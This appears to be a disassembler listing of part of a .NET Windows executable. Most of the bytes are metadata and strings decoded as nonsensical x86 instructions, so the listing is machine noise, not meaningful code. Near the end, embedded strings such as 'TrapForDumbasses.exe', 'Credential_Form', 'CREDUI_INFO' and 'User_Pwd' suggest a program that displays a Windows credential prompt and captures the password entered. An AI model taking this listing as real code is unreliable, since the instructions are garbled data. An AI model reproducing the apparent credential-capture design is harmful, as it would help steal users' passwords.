  406e35:	02 35 00 5c 00 3e    	add    0x3e005c00,%dh
  406e3b:	16                   	push   %ss
  406e3c:	dc 04 51             	faddl  (%ecx,%edx,2)
  406e3f:	03 ae 0b fc 06 5c    	add    0x5c06fc0b(%esi),%ebp
  406e45:	00 08                	add    %cl,(%eax)
  406e47:	20 35 00 4c 00 52    	and    %dh,0x52004c00
  406e4d:	02 35 00 4c 00 fa    	add    0xfa004c00,%dh
  406e53:	1f                   	pop    %ds
  406e54:	e9 06 99 01 11       	jmp    0x1142075f
  406e59:	20 00                	and    %al,(%eax)
  406e5b:	07                   	pop    %es
  406e5c:	99                   	cltd
  406e5d:	01 2a                	add    %ebp,(%edx)
  406e5f:	20 07                	and    %al,(%edi)
  406e61:	07                   	pop    %es
  406e62:	99                   	cltd
  406e63:	01 48 20             	add    %ecx,0x20(%eax)
  406e66:	0f 07                	sysret
  406e68:	f9                   	stc
  406e69:	02 66 07             	add    0x7(%esi),%ah
  406e6c:	1a 07                	sbb    (%edi),%al
  406e6e:	99                   	cltd
  406e6f:	01 6f 20             	add    %ebp,0x20(%edi)
  406e72:	27                   	daa
  406e73:	07                   	pop    %es
  406e74:	09 04 90             	or     %eax,(%eax,%edx,4)
  406e77:	20 eb                	and    %ch,%bl
  406e79:	01 49 02             	add    %ecx,0x2(%ecx)
  406e7c:	a8 20                	test   $0x20,%al
  406e7e:	2d 07 19 04 cb       	sub    $0xcb041907,%eax
  406e83:	20 34 07             	and    %dh,(%edi,%eax,1)
  406e86:	21 04 52             	and    %eax,(%edx,%edx,2)
  406e89:	02 3a                	add    (%edx),%bh
  406e8b:	07                   	pop    %es
  406e8c:	29 04 ec             	sub    %eax,(%esp,%ebp,8)
  406e8f:	20 33                	and    %dh,(%ebx)
  406e91:	01 31                	add    %esi,(%ecx)
  406e93:	04 fb                	add    $0xfb,%al
  406e95:	20 44 07 d1          	and    %al,-0x2f(%edi,%eax,1)
  406e99:	03 08                	add    (%eax),%ecx
  406e9b:	21 4a 07             	and    %ecx,0x7(%edx)
  406e9e:	39 04 52             	cmp    %eax,(%edx,%edx,2)
  406ea1:	02 37                	add    (%edi),%dh
  406ea3:	01 39                	add    %edi,(%ecx)
  406ea5:	04 37                	add    $0x37,%al
  406ea7:	21 51 07             	and    %edx,0x7(%ecx)
  406eaa:	49                   	dec    %ecx
  406eab:	04 43                	add    $0x43,%al
  406ead:	21 06                	and    %eax,(%esi)
  406eaf:	01 41 04             	add    %eax,0x4(%ecx)
  406eb2:	5f                   	pop    %edi
  406eb3:	21 58 07             	and    %ebx,0x7(%eax)
  406eb6:	51                   	push   %ecx
  406eb7:	04 a3                	add    $0xa3,%al
  406eb9:	17                   	pop    %ss
  406eba:	ec                   	in     (%dx),%al
  406ebb:	00 59 04             	add    %bl,0x4(%ecx)
  406ebe:	71 21                	jno    0x406ee1
  406ec0:	5e                   	pop    %esi
  406ec1:	07                   	pop    %es
  406ec2:	d1 03                	roll   $1,(%ebx)
  406ec4:	7a 21                	jp     0x406ee7
  406ec6:	4a                   	dec    %edx
  406ec7:	07                   	pop    %es
  406ec8:	51                   	push   %ecx
  406ec9:	04 54                	add    $0x54,%al
  406ecb:	1a 65 07             	sbb    0x7(%ebp),%ah
  406ece:	61                   	popa
  406ecf:	04 8f                	add    $0x8f,%al
  406ed1:	21 33                	and    %esi,(%ebx)
  406ed3:	01 99 01 6f 20 33    	add    %ebx,0x33206f01(%ecx)
  406ed9:	01 99 01 99 21 33    	add    %ebx,0x33219901(%ecx)
  406edf:	01 d1                	add    %edx,%ecx
  406ee1:	03 7a 21             	add    0x21(%edx),%edi
  406ee4:	6c                   	insb   (%dx),%es:(%edi)
  406ee5:	07                   	pop    %es
  406ee6:	d1 03                	roll   $1,(%ebx)
  406ee8:	a9 21 74 07 d1       	test   $0xd1077421,%eax
  406eed:	03 b5 21 4a 07 71    	add    0x71074a21(%ebp),%esi
  406ef3:	04 52                	add    $0x52,%al
  406ef5:	02 65 04             	add    0x4(%ebp),%ah
  406ef8:	d1 03                	roll   $1,(%ebx)
  406efa:	e3 21                	jecxz  0x406f1d
  406efc:	7b 07                	jnp    0x406f05
  406efe:	81 04 fa 21 9d 07 d1 	addl   $0xd1079d21,(%edx,%edi,8)
  406f05:	03 34 1b             	add    (%ebx,%ebx,1),%esi
  406f08:	35 00 d1 03 18       	xor    $0x1803d100,%eax
  406f0d:	22 a2 07 89 04 42    	and    0x42048907(%edx),%ah
  406f13:	22 a8 07 89 04 4c    	and    0x4c048907(%eax),%ch
  406f19:	22 9e 06 c1 03 92    	and    -0x6dfc3efa(%esi),%bl
  406f1f:	14 35                	adc    $0x35,%al
  406f21:	00 49 03             	add    %cl,0x3(%ecx)
  406f24:	52                   	push   %edx
  406f25:	02 37                	add    (%edi),%dh
  406f27:	01 99 04 52 02 35    	add    %ebx,0x35025204(%ecx)
  406f2d:	00 08                	add    %cl,(%eax)
  406f2f:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406f32:	46                   	inc    %esi
  406f33:	00 08                	add    %cl,(%eax)
  406f35:	00 20                	add    %ah,(%eax)
  406f37:	00 4b 00             	add    %cl,0x0(%ebx)
  406f3a:	08 00                	or     %al,(%eax)
  406f3c:	24 00                	and    $0x0,%al
  406f3e:	50                   	push   %eax
  406f3f:	00 08                	add    %cl,(%eax)
  406f41:	00 28                	add    %ch,(%eax)
  406f43:	00 55 00             	add    %dl,0x0(%ebp)
  406f46:	08 00                	or     %al,(%eax)
  406f48:	2c 00                	sub    $0x0,%al
  406f4a:	5a                   	pop    %edx
  406f4b:	00 08                	add    %cl,(%eax)
  406f4d:	00 30                	add    %dh,(%eax)
  406f4f:	00 5f 00             	add    %bl,0x0(%edi)
  406f52:	08 00                	or     %al,(%eax)
  406f54:	34 00                	xor    $0x0,%al
  406f56:	64 00 08             	add    %cl,%fs:(%eax)
  406f59:	00 38                	add    %bh,(%eax)
  406f5b:	00 69 00             	add    %ch,0x0(%ecx)
  406f5e:	08 00                	or     %al,(%eax)
  406f60:	3c 00                	cmp    $0x0,%al
  406f62:	6e                   	outsb  %ds:(%esi),(%dx)
  406f63:	00 08                	add    %cl,(%eax)
  406f65:	00 40 00             	add    %al,0x0(%eax)
  406f68:	73 00                	jae    0x406f6a
  406f6a:	08 00                	or     %al,(%eax)
  406f6c:	44                   	inc    %esp
  406f6d:	00 78 00             	add    %bh,0x0(%eax)
  406f70:	08 00                	or     %al,(%eax)
  406f72:	48                   	dec    %eax
  406f73:	00 7d 00             	add    %bh,0x0(%ebp)
  406f76:	08 00                	or     %al,(%eax)
  406f78:	4c                   	dec    %esp
  406f79:	00 82 00 08 00 50    	add    %al,0x50000800(%edx)
  406f7f:	00 87 00 08 00 54    	add    %al,0x54000800(%edi)
  406f85:	00 8c 00 08 00 58 00 	add    %cl,0x580008(%eax,%eax,1)
  406f8c:	91                   	xchg   %eax,%ecx
  406f8d:	00 08                	add    %cl,(%eax)
  406f8f:	00 5c 00 96          	add    %bl,-0x6a(%eax,%eax,1)
  406f93:	00 08                	add    %cl,(%eax)
  406f95:	00 64 00 9f          	add    %ah,-0x61(%eax,%eax,1)
  406f99:	00 08                	add    %cl,(%eax)
  406f9b:	00 68 00             	add    %ch,0x0(%eax)
  406f9e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406f9f:	00 08                	add    %cl,(%eax)
  406fa1:	00 6c 00 a9          	add    %ch,-0x57(%eax,%eax,1)
  406fa5:	00 08                	add    %cl,(%eax)
  406fa7:	00 70 00             	add    %dh,0x0(%eax)
  406faa:	ae                   	scas   %es:(%edi),%al
  406fab:	00 08                	add    %cl,(%eax)
  406fad:	00 74 00 b3          	add    %dh,-0x4d(%eax,%eax,1)
  406fb1:	00 08                	add    %cl,(%eax)
  406fb3:	00 78 00             	add    %bh,0x0(%eax)
  406fb6:	b8 00 08 00 7c       	mov    $0x7c000800,%eax
  406fbb:	00 bd 00 08 00 80    	add    %bh,-0x7ffff800(%ebp)
  406fc1:	00 c2                	add    %al,%dl
  406fc3:	00 09                	add    %cl,(%ecx)
  406fc5:	00 e0                	add    %ah,%al
  406fc7:	00 9f 00 09 00 e4    	add    %bl,-0x1bfff700(%edi)
  406fcd:	00 46 00             	add    %al,0x0(%esi)
  406fd0:	09 00                	or     %eax,(%eax)
  406fd2:	e8 00 4b 00 09       	call   0x940bad7
  406fd7:	00 ec                	add    %ch,%ah
  406fd9:	00 f6                	add    %dh,%dh
  406fdb:	01 09                	add    %ecx,(%ecx)
  406fdd:	00 f0                	add    %dh,%al
  406fdf:	00 fb                	add    %bh,%bl
  406fe1:	01 09                	add    %ecx,(%ecx)
  406fe3:	00 f8                	add    %bh,%al
  406fe5:	00 04 02             	add    %al,(%edx,%eax,1)
  406fe8:	09 00                	or     %eax,(%eax)
  406fea:	fc                   	cld
  406feb:	00 09                	add    %cl,(%ecx)
  406fed:	02 09                	add    (%ecx),%cl
  406fef:	00 00                	add    %al,(%eax)
  406ff1:	01 0e                	add    %ecx,(%esi)
  406ff3:	02 2e                	add    (%esi),%ch
  406ff5:	00 2b                	add    %ch,(%ebx)
  406ff7:	00 00                	add    %al,(%eax)
  406ff9:	08 2e                	or     %ch,(%esi)
  406ffb:	00 53 00             	add    %dl,0x0(%ebx)
  406ffe:	0f 08                	invd
  407000:	2e 00 1b             	add    %bl,%cs:(%ebx)
  407003:	00 00                	add    %al,(%eax)
  407005:	08 2e                	or     %ch,(%esi)
  407007:	00 23                	add    %ah,(%ebx)
  407009:	00 00                	add    %al,(%eax)
  40700b:	08 2e                	or     %ch,(%esi)
  40700d:	00 33                	add    %dh,(%ebx)
  40700f:	00 00                	add    %al,(%eax)
  407011:	08 2e                	or     %ch,(%esi)
  407013:	00 3b                	add    %bh,(%ebx)
  407015:	00 00                	add    %al,(%eax)
  407017:	08 2e                	or     %ch,(%esi)
  407019:	00 43 00             	add    %al,0x0(%ebx)
  40701c:	00 08                	add    %cl,(%eax)
  40701e:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  407022:	06                   	push   %es
  407023:	08 83 00 9b 00 46    	or     %al,0x46009b00(%ebx)
  407029:	00 c3                	add    %al,%bl
  40702b:	02 eb                	add    %bl,%ch
  40702d:	08 46 00             	or     %al,0x0(%esi)
  407030:	e0 0e                	loopne 0x407040
  407032:	f3 06                	repz push %es
  407034:	46                   	inc    %esi
  407035:	00 13                	add    %dl,(%ebx)
  407037:	00 e9                	add    %ch,%cl
  407039:	02 65 00             	add    0x0(%ebp),%ah
  40703c:	eb 02                	jmp    0x407040
  40703e:	04 03                	add    $0x3,%al
  407040:	43                   	inc    %ebx
  407041:	03 50 03             	add    0x3(%eax),%edx
  407044:	55                   	push   %ebp
  407045:	03 ed                	add    %ebp,%ebp
  407047:	03 2e                	add    (%esi),%ebp
  407049:	04 54                	add    $0x54,%al
  40704b:	04 5b                	add    $0x5b,%al
  40704d:	04 99                	add    $0x99,%al
  40704f:	04 06                	add    $0x6,%al
  407051:	05 34 05 e1 05       	add    $0x5e10534,%eax
  407056:	20 06                	and    %al,(%esi)
  407058:	31 06                	xor    %eax,(%esi)
  40705a:	3d 06 57 06 60       	cmp    $0x60065706,%eax
  40705f:	06                   	push   %es
  407060:	7c 06                	jl     0x407068
  407062:	ae                   	scas   %es:(%edi),%al
  407063:	07                   	pop    %es
  407064:	07                   	pop    %es
  407065:	00 01                	add    %al,(%ecx)
  407067:	00 11                	add    %dl,(%ecx)
  407069:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40706c:	12 00                	adc    (%eax),%al
  40706e:	0d 00 13 00 14       	or     $0x14001300,%eax
  407073:	00 14 00             	add    %dl,(%eax,%eax,1)
  407076:	1e                   	push   %ds
  407077:	00 15 00 20 00 00    	add    %dl,0x2000
  40707d:	00 b0 06 3c 01 00    	add    %dh,0x13c06(%eax)
  407083:	00 c0                	add    %al,%al
  407085:	06                   	push   %es
  407086:	41                   	inc    %ecx
  407087:	01 00                	add    %eax,(%eax)
  407089:	00 cb                	add    %cl,%bl
  40708b:	06                   	push   %es
  40708c:	46                   	inc    %esi
  40708d:	01 00                	add    %eax,(%eax)
  40708f:	00 da                	add    %bl,%dl
  407091:	06                   	push   %es
  407092:	4b                   	dec    %ebx
  407093:	01 00                	add    %eax,(%eax)
  407095:	00 e5                	add    %ah,%ch
  407097:	06                   	push   %es
  407098:	3c 01                	cmp    $0x1,%al
  40709a:	00 00                	add    %al,(%eax)
  40709c:	f5                   	cmc
  40709d:	06                   	push   %es
  40709e:	4f                   	dec    %edi
  40709f:	01 00                	add    %eax,(%eax)
  4070a1:	00 02                	add    %al,(%edx)
  4070a3:	07                   	pop    %es
  4070a4:	41                   	inc    %ecx
  4070a5:	01 00                	add    %eax,(%eax)
  4070a7:	00 18                	add    %bl,(%eax)
  4070a9:	07                   	pop    %es
  4070aa:	41                   	inc    %ecx
  4070ab:	01 00                	add    %eax,(%eax)
  4070ad:	00 26                	add    %ah,(%esi)
  4070af:	07                   	pop    %es
  4070b0:	46                   	inc    %esi
  4070b1:	01 00                	add    %eax,(%eax)
  4070b3:	00 35 07 41 01 00    	add    %dh,0x14107
  4070b9:	00 40 07             	add    %al,0x7(%eax)
  4070bc:	53                   	push   %ebx
  4070bd:	01 00                	add    %eax,(%eax)
  4070bf:	00 58 0c             	add    %bl,0xc(%eax)
  4070c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4070c3:	02 00                	add    (%eax),%al
  4070c5:	00 98 0d ad 02 00    	add    %bl,0x2ad0d(%eax)
  4070cb:	00 a4 0d b2 02 00 00 	add    %ah,0x2b2(%ebp,%ecx,1)
  4070d2:	b3 0d                	mov    $0xd,%bl
  4070d4:	b2 02                	mov    $0x2,%dl
  4070d6:	00 00                	add    %al,(%eax)
  4070d8:	c4 0d b8 02 00 00    	les    0x2b8,%ecx
  4070de:	cf                   	iret
  4070df:	0d 53 01 00 00       	or     $0x153,%eax
  4070e4:	d4 0d                	aam    $0xd
  4070e6:	be 02 00 00 27       	mov    $0x27000002,%esi
  4070eb:	0d c3 02 00 00       	or     $0x2c3,%eax
  4070f0:	4f                   	dec    %edi
  4070f1:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  4070f4:	00 00                	add    %al,(%eax)
  4070f6:	64 0a 3c 01          	or     %fs:(%ecx,%eax,1),%bh
  4070fa:	00 00                	add    %al,(%eax)
  4070fc:	79 0a                	jns    0x407108
  4070fe:	3c 01                	cmp    $0x1,%al
  407100:	00 00                	add    %al,(%eax)
  407102:	90                   	nop
  407103:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  407106:	00 00                	add    %al,(%eax)
  407108:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407109:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  40710c:	00 00                	add    %al,(%eax)
  40710e:	bc 0a 3c 01 00       	mov    $0x13c0a,%esp
  407113:	00 d1                	add    %dl,%cl
  407115:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  407118:	00 00                	add    %al,(%eax)
  40711a:	e8 0a 3c 01 00       	call   0x41ad29
  40711f:	00 ff                	add    %bh,%bh
  407121:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  407124:	00 00                	add    %al,(%eax)
  407126:	17                   	pop    %ss
  407127:	0b 3c 01             	or     (%ecx,%eax,1),%edi
  40712a:	00 00                	add    %al,(%eax)
  40712c:	23 10                	and    (%eax),%edx
  40712e:	4f                   	dec    %edi
  40712f:	01 00                	add    %eax,(%eax)
  407131:	00 2e                	add    %ch,(%esi)
  407133:	10 4b 01             	adc    %cl,0x1(%ebx)
  407136:	00 00                	add    %al,(%eax)
  407138:	23 10                	and    (%eax),%edx
  40713a:	4f                   	dec    %edi
  40713b:	01 00                	add    %eax,(%eax)
  40713d:	00 2e                	add    %ch,(%esi)
  40713f:	10 4b 01             	adc    %cl,0x1(%ebx)
  407142:	02 00                	add    (%eax),%al
  407144:	05 00 03 00 01       	add    $0x1000300,%eax
  407149:	00 06                	add    %al,(%esi)
  40714b:	00 03                	add    %al,(%ebx)
  40714d:	00 02                	add    %al,(%edx)
  40714f:	00 07                	add    %al,(%edi)
  407151:	00 05 00 01 00 08    	add    %al,0x8000100
  407157:	00 05 00 02 00 09    	add    %al,0x9000200
  40715d:	00 07                	add    %al,(%edi)
  40715f:	00 01                	add    %al,(%ecx)
  407161:	00 0a                	add    %cl,(%edx)
  407163:	00 07                	add    %al,(%edi)
  407165:	00 02                	add    %al,(%edx)
  407167:	00 0b                	add    %cl,(%ebx)
  407169:	00 09                	add    %cl,(%ecx)
  40716b:	00 01                	add    %al,(%ecx)
  40716d:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407170:	09 00                	or     %eax,(%eax)
  407172:	01 00                	add    %eax,(%eax)
  407174:	0f 00 0b             	str    (%ebx)
  407177:	00 02                	add    %al,(%edx)
  407179:	00 0e                	add    %cl,(%esi)
  40717b:	00 0b                	add    %cl,(%ebx)
  40717d:	00 02                	add    %al,(%edx)
  40717f:	00 11                	add    %dl,(%ecx)
  407181:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407187:	00 0f                	add    %cl,(%edi)
  407189:	00 02                	add    %al,(%edx)
  40718b:	00 13                	add    %dl,(%ebx)
  40718d:	00 11                	add    %dl,(%ecx)
  40718f:	00 02                	add    %al,(%edx)
  407191:	00 18                	add    %bl,(%eax)
  407193:	00 13                	add    %dl,(%ebx)
  407195:	00 01                	add    %al,(%ecx)
  407197:	00 19                	add    %bl,(%ecx)
  407199:	00 13                	add    %dl,(%ebx)
  40719b:	00 01                	add    %al,(%ecx)
  40719d:	00 1b                	add    %bl,(%ebx)
  40719f:	00 15 00 02 00 1a    	add    %dl,0x1a000200
  4071a5:	00 15 00 02 00 1c    	add    %dl,0x1c000200
  4071ab:	00 17                	add    %dl,(%edi)
  4071ad:	00 01                	add    %al,(%ecx)
  4071af:	00 1d 00 17 00 02    	add    %bl,0x2001700
  4071b5:	00 3f                	add    %bh,(%edi)
  4071b7:	00 19                	add    %bl,(%ecx)
  4071b9:	00 02                	add    %al,(%edx)
  4071bb:	00 4e 00             	add    %cl,0x0(%esi)
  4071be:	1b 00                	sbb    (%eax),%eax
  4071c0:	02 00                	add    (%eax),%al
  4071c2:	4f                   	dec    %edi
  4071c3:	00 1d 00 02 00 50    	add    %bl,0x50000200
  4071c9:	00 1f                	add    %bl,(%edi)
  4071cb:	00 02                	add    %al,(%edx)
  4071cd:	00 51 00             	add    %dl,0x0(%ecx)
  4071d0:	21 00                	and    %eax,(%eax)
  4071d2:	02 00                	add    (%eax),%al
  4071d4:	52                   	push   %edx
  4071d5:	00 23                	add    %ah,(%ebx)
  4071d7:	00 02                	add    %al,(%edx)
  4071d9:	00 53 00             	add    %dl,0x0(%ebx)
  4071dc:	25 00 02 00 54       	and    $0x54000200,%eax
  4071e1:	00 27                	add    %ah,(%edi)
  4071e3:	00 02                	add    %al,(%edx)
  4071e5:	00 5b 00             	add    %bl,0x0(%ebx)
  4071e8:	29 00                	sub    %eax,(%eax)
  4071ea:	01 00                	add    %eax,(%eax)
  4071ec:	5c                   	pop    %esp
  4071ed:	00 29                	add    %ch,(%ecx)
  4071ef:	00 01                	add    %al,(%ecx)
  4071f1:	00 5e 00             	add    %bl,0x0(%esi)
  4071f4:	2b 00                	sub    (%eax),%eax
  4071f6:	02 00                	add    (%eax),%al
  4071f8:	5d                   	pop    %ebp
  4071f9:	00 2b                	add    %ch,(%ebx)
  4071fb:	00 02                	add    %al,(%edx)
  4071fd:	00 5f 00             	add    %bl,0x0(%edi)
  407200:	2d 00 01 00 60       	sub    $0x60000100,%eax
  407205:	00 2d 00 01 00 62    	add    %ch,0x62000100
  40720b:	00 2f                	add    %ch,(%edi)
  40720d:	00 02                	add    %al,(%edx)
  40720f:	00 61 00             	add    %ah,0x0(%ecx)
  407212:	2f                   	das
  407213:	00 02                	add    %al,(%edx)
  407215:	00 63 00             	add    %ah,0x0(%ebx)
  407218:	31 00                	xor    %eax,(%eax)
  40721a:	01 00                	add    %eax,(%eax)
  40721c:	64 00 31             	add    %dh,%fs:(%ecx)
  40721f:	00 02                	add    %al,(%edx)
  407221:	00 65 00             	add    %ah,0x0(%ebp)
  407224:	33 00                	xor    (%eax),%eax
  407226:	01 00                	add    %eax,(%eax)
  407228:	66 00 33             	data16 add %dh,(%ebx)
  40722b:	00 02                	add    %al,(%edx)
  40722d:	00 67 00             	add    %ah,0x0(%edi)
  407230:	35 00 01 00 68       	xor    $0x68000100,%eax
  407235:	00 35 00 02 00 69    	add    %dh,0x69000200
  40723b:	00 37                	add    %dh,(%edi)
  40723d:	00 01                	add    %al,(%ecx)
  40723f:	00 6a 00             	add    %ch,0x0(%edx)
  407242:	37                   	aaa
  407243:	00 01                	add    %al,(%ecx)
  407245:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  407249:	00 02                	add    %al,(%edx)
  40724b:	00 6b 00             	add    %ch,0x0(%ebx)
  40724e:	39 00                	cmp    %eax,(%eax)
  407250:	02 00                	add    (%eax),%al
  407252:	6d                   	insl   (%dx),%es:(%edi)
  407253:	00 3b                	add    %bh,(%ebx)
  407255:	00 01                	add    %al,(%ecx)
  407257:	00 6e 00             	add    %ch,0x0(%esi)
  40725a:	3b 00                	cmp    (%eax),%eax
  40725c:	01 00                	add    %eax,(%eax)
  40725e:	70 00                	jo     0x407260
  407260:	3d 00 02 00 6f       	cmp    $0x6f000200,%eax
  407265:	00 3d 00 02 00 71    	add    %bh,0x71000200
  40726b:	00 3f                	add    %bh,(%edi)
  40726d:	00 01                	add    %al,(%ecx)
  40726f:	00 72 00             	add    %dh,0x0(%edx)
  407272:	3f                   	aas
  407273:	00 02                	add    %al,(%edx)
  407275:	00 73 00             	add    %dh,0x0(%ebx)
  407278:	41                   	inc    %ecx
  407279:	00 01                	add    %al,(%ecx)
  40727b:	00 74 00 41          	add    %dh,0x41(%eax,%eax,1)
  40727f:	00 02                	add    %al,(%edx)
  407281:	00 75 00             	add    %dh,0x0(%ebp)
  407284:	43                   	inc    %ebx
  407285:	00 01                	add    %al,(%ecx)
  407287:	00 76 00             	add    %dh,0x0(%esi)
  40728a:	43                   	inc    %ebx
  40728b:	00 1c 14             	add    %bl,(%esp,%edx,1)
  40728e:	55                   	push   %ebp
  40728f:	15 0f 1c 26 03       	adc    $0x3261c0f,%eax
  407294:	08 04 19             	or     %al,(%ecx,%ebx,1)
  407297:	04 ab                	add    $0xab,%al
  407299:	04 41                	add    $0x41,%al
  40729b:	05 49 05 51 05       	add    $0x5510549,%eax
  4072a0:	95                   	xchg   %eax,%ebp
  4072a1:	06                   	push   %es
  4072a2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4072a3:	06                   	push   %es
  4072a4:	e0 06                	loopne 0x4072ac
  4072a6:	f5                   	cmc
  4072a7:	06                   	push   %es
  4072a8:	04 01                	add    $0x1,%al
  4072aa:	03 00                	add    (%eax),%eax
  4072ac:	fd                   	std
  4072ad:	01 01                	add    %eax,(%ecx)
  4072af:	00 04 02             	add    %al,(%edx,%eax,1)
  4072b2:	3f                   	aas
  4072b3:	00 4c 07 02          	add    %cl,0x2(%edi,%eax,1)
  4072b7:	00 00                	add    %al,(%eax)
  4072b9:	01 4b 00             	add    %ecx,0x0(%ebx)
  4072bc:	a9 07 02 00 00       	test   $0x207,%eax
  4072c1:	01 69 00             	add    %ebp,0x0(%ecx)
  4072c4:	75 09                	jne    0x4072cf
  4072c6:	03 00                	add    (%eax),%eax
  4072c8:	00 01                	add    %al,(%ecx)
  4072ca:	6b 00 82             	imul   $0xffffff82,(%eax),%eax
  4072cd:	09 03                	or     %eax,(%ebx)
  4072cf:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  4072e2:	f8                   	clc
  4072e3:	13 00                	adc    (%eax),%eax
  4072e5:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4072f0:	00 00                	add    %al,(%eax)
  4072f2:	01 00                	add    %eax,(%eax)
  4072f4:	32 01                	xor    (%ecx),%al
  4072f6:	00 00                	add    %al,(%eax)
  4072f8:	00 00                	add    %al,(%eax)
  4072fa:	03 00                	add    (%eax),%eax
	...
  407304:	00 00                	add    %al,(%eax)
  407306:	0a 00                	or     (%eax),%al
  407308:	58                   	pop    %eax
  407309:	01 00                	add    %eax,(%eax)
  40730b:	00 00                	add    %al,(%eax)
  40730d:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  407318:	00 00                	add    %al,(%eax)
  40731a:	01 00                	add    %eax,(%eax)
  40731c:	ae                   	scas   %es:(%edi),%al
  40731d:	01 00                	add    %eax,(%eax)
  40731f:	00 00                	add    %al,(%eax)
  407321:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40732c:	00 00                	add    %al,(%eax)
  40732e:	01 00                	add    %eax,(%eax)
  407330:	3b 01                	cmp    (%ecx),%eax
  407332:	00 00                	add    %al,(%eax)
  407334:	00 00                	add    %al,(%eax)
  407336:	04 00                	add    $0x0,%al
	...
  407340:	00 00                	add    %al,(%eax)
  407342:	b2 01                	mov    $0x1,%dl
  407344:	8c 08                	mov    %cs,(%eax)
	...
  40734e:	01 00                	add    %eax,(%eax)
  407350:	00 00                	add    %al,(%eax)
  407352:	72 22                	jb     0x407376
  407354:	00 00                	add    %al,(%eax)
  407356:	03 00                	add    (%eax),%eax
  407358:	02 00                	add    (%eax),%al
  40735a:	04 00                	add    $0x0,%al
  40735c:	02 00                	add    (%eax),%al
  40735e:	05 00 02 00 06       	add    $0x6000200,%eax
  407363:	00 02                	add    %al,(%edx)
  407365:	00 0b                	add    %cl,(%ebx)
  407367:	00 0a                	add    %cl,(%edx)
  407369:	00 0d 00 0c 00 0f    	add    %cl,0xf000c00
  40736f:	00 0e                	add    %cl,(%esi)
  407371:	00 10                	add    %dl,(%eax)
  407373:	00 0e                	add    %cl,(%esi)
  407375:	00 13                	add    %dl,(%ebx)
  407377:	00 12                	add    %dl,(%edx)
  407379:	00 16                	add    %dl,(%esi)
  40737b:	00 15 00 1d 00 ff    	add    %dl,0xff001d00
  407381:	02 2b                	add    (%ebx),%ch
  407383:	02 97 07 00 00 00    	add    0x7(%edi),%dl
  407389:	3c 4d                	cmp    $0x4d,%al
  40738b:	6f                   	outsl  %ds:(%esi),(%dx)
  40738c:	64 75 6c             	fs jne 0x4073fb
  40738f:	65 3e 00 54 72 61    	gs add %dl,%ds:0x61(%edx,%esi,2)
  407395:	70 46                	jo     0x4073dd
  407397:	6f                   	outsl  %ds:(%esi),(%dx)
  407398:	72 44                	jb     0x4073de
  40739a:	75 6d                	jne    0x407409
  40739c:	62 61 73             	bound  %esp,0x73(%ecx)
  40739f:	73 65                	jae    0x407406
  4073a1:	73 2e                	jae    0x4073d1
  4073a3:	65 78 65             	gs js  0x40740b
  4073a6:	00 43 72             	add    %al,0x72(%ebx)
  4073a9:	65 64 65 6e          	gs fs outsb %gs:(%esi),(%dx)
  4073ad:	74 69                	je     0x407418
  4073af:	61                   	popa
  4073b0:	6c                   	insb   (%dx),%es:(%edi)
  4073b1:	5f                   	pop    %edi
  4073b2:	46                   	inc    %esi
  4073b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4073b4:	72 6d                	jb     0x407423
  4073b6:	00 4d 6f             	add    %cl,0x6f(%ebp)
  4073b9:	64 75 6c             	fs jne 0x407428
  4073bc:	65 4e                	gs dec %esi
  4073be:	61                   	popa
  4073bf:	6d                   	insl   (%dx),%es:(%edi)
  4073c0:	65 53                	gs push %ebx
  4073c2:	70 61                	jo     0x407425
  4073c4:	63 65 00             	arpl   %esp,0x0(%ebp)
  4073c7:	43                   	inc    %ebx
  4073c8:	52                   	push   %edx
  4073c9:	45                   	inc    %ebp
  4073ca:	44                   	inc    %esp
  4073cb:	55                   	push   %ebp
  4073cc:	49                   	dec    %ecx
  4073cd:	5f                   	pop    %edi
  4073ce:	49                   	dec    %ecx
  4073cf:	4e                   	dec    %esi
  4073d0:	46                   	inc    %esi
  4073d1:	4f                   	dec    %edi
  4073d2:	00 43 52             	add    %al,0x52(%ebx)
  4073d5:	45                   	inc    %ebp
  4073d6:	44                   	inc    %esp
  4073d7:	55                   	push   %ebp
  4073d8:	49                   	dec    %ecx
  4073d9:	5f                   	pop    %edi
  4073da:	46                   	inc    %esi
  4073db:	4c                   	dec    %esp
  4073dc:	41                   	inc    %ecx
  4073dd:	47                   	inc    %edi
  4073de:	53                   	push   %ebx
  4073df:	00 43 72             	add    %al,0x72(%ebx)
  4073e2:	65 64 55             	gs fs push %ebp
  4073e5:	49                   	dec    %ecx
  4073e6:	5f                   	pop    %edi
  4073e7:	52                   	push   %edx
  4073e8:	65 74 75             	gs je  0x407460
  4073eb:	72 6e                	jb     0x40745b
  4073ed:	43                   	inc    %ebx
  4073ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4073ef:	64 65 73 00          	fs gs jae 0x4073f3
  4073f3:	55                   	push   %ebp
  4073f4:	73 65                	jae    0x40745b
  4073f6:	72 5f                	jb     0x407457
  4073f8:	50                   	push   %eax
  4073f9:	77 64                	ja     0x40745f
  4073fb:	00 4d 61             	add    %cl,0x61(%ebp)
  4073fe:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407405:	65 52                	gs push %edx
  407407:	61                   	popa
  407408:	77 55                	ja     0x40745f
  40740a:	49                   	dec    %ecx
  40740b:	00 49 6e             	add    %cl,0x6e(%ecx)
  40740e:	70 75                	jo     0x407485
  407410:	74 5f                	je     0x407471
  407412:	42                   	inc    %edx
  407413:	6f                   	outsl  %ds:(%esi),(%dx)
  407414:	78 00                	js     0x407416
  407416:	43                   	inc    %ebx
  407417:	68 6f 69 63 65       	push   $0x6563696f
  40741c:	5f                   	pop    %edi
